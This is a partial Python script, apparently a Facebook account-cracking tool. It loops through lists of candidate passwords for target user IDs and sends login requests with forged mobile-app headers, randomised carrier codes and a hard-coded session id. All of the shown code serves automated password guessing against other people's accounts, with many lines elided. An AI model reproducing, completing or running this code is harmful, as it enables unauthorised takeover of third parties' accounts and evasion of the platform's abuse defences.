...
def freefb(uid, name, pwx, tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            'X-FB-Connection-Bandwidth': '20707238',
            'X-FB-Net-HNI': str(random.randint(20000,40000)),
            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': '2685',
...
def d(uid,pwx,tl):
    ...
    '__a': '1',
    '__req': '9',
    '__hs': '20306.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '3',
    '__ccg': 'MODERATE',
    '__rev': '1025574198',
    '__s': ':0ybo1h:k0mdxy',
    '__hsi': '7535547316855088202',
    ...
    'params': json.dumps({
        "params": json.dumps({
            "server_params": {
                "credential_type": "password",
                "username_text_input_id": "brqi1q:69",
                "password_text_input_id": "brqi1q:70",
                "login_source": "Login",
                "login_credential_type": "none",
                "server_login_source": "login",
                "ar_event_source": "login_home_page",
                ...
                "INTERNALlatency_qpl_instance_id": "71171401400448",
                "device_id": None,
                "family_device_id": None,
                "waterfall_id": "02bf54f1-f70f-43d4-a581-bb0182c44199",
                "offline_experiment_group": None,
                "layered_homepage_experiment_group": None,
                "is_platform_login": 0,
                "is_from_logged_in_switcher": 0,
            ...
            "client_input_params": {
                ...
                "block_store_machine_id": "",
                "contact_point": uid,
                "password": "#PWD_BROWSER:5:{}:{}".format(str(int(time.time())), pw),
                "accounts_list": [],
                "fb_ig_device_id": [],
                "secure_family_device_id": "",
                "encrypted_msisdn": "",
                ...
                "has_whatsapp_installed": 0,
                "sso_token_map_json_string": "",
                "shold_show_nested_nta_from_aymh": 0,
                "password_contains_non_ascii": "false",
                "has_granted_read_contacts_permissions": 0,
                "has_granted_read_phone_permissions": 0,
                "app_manager_id": "",
